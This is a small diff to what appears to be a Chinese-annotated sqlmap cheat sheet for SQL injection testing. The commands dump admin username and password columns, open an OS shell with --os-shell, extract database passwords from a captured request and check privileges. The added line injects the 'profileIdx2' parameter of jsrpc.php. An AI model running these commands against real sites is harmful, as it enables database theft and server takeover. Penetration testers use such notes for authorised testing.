@@ -22,6 +22,7 @@ sqlmap -u http://url.php?id=1 -D test -T admin --columns # 得到admin,pass
 sqlmap -u http://url.php?id=1 -D test -T admin -C admin,pass --dump
 sqlmap -u http://url.php?id=1 -D test -T admin -C admin,pass --dump --hex
 sqlmap -u http://url.php?id=1 --os-shell
+sqlmap -u http://url/jsrpc.php?profileIdx2= -p "profileIdx2" --dbs # -p 注入参数名
 --priviledges # 用户权限
 
 sqlmap -r b.txt --passwords --batch     # bp抓包保存为 b.txt
